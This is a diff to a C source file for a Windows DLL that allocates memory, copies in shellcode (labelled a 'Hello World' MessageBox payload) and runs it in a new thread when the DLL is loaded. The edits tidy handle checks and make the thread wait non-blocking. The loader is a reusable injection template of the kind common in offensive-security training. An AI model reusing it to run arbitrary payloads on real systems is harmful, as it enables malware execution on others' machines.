@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#define IS_HANDLE_INVALID(x) (x==NULL || x==INVALID_HANDLE_VALUE)
 
 // "Hello World" MessageBox shellcode
 unsigned char payload[] = 
@@ -39,10 +40,9 @@ size_t payload_len = sizeof(payload);
 
 
 extern __declspec(dllexport) int injectme(void) {
-    void * pAddress;
     DWORD oldprotect = 0;
 
-    pAddress = VirtualAlloc(
+    void * pAddress = VirtualAlloc(
         0,                              // The starting address of the region to allocate
         payload_len,                    // Size of payload
         MEM_COMMIT | MEM_RESERVE,       // To reserve and commit pages in one step
@@ -82,14 +82,14 @@ extern __declspec(dllexport) int injectme(void) {
         0                                    // Do not return thread identifier
     );
 
-    if (hThread == INVALID_HANDLE_VALUE) {
+    if (IS_HANDLE_INVALID(hThread)) {
         fprintf(stderr, "[!] CreateThread() failed (0x%x)\n", GetLastError());
         return -1;
     }
 
-    // Wait for thread to finish
-    int _result = WaitForSingleObject(hThread, -1);
-    if (_result != 0) {
+    // Do not enter a wait state
+    int _result = WaitForSingleObject(hThread, 0);
+    if (_result == WAIT_FAILED) {
         fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
         CloseHandle(hThread);        
         return -1;
@@ -108,11 +108,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
             else 
                 printf("[i] Injection successful!\n");
             break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-        case DLL_PROCESS_DETACH:
+        default:
             break;
         }
     return TRUE;
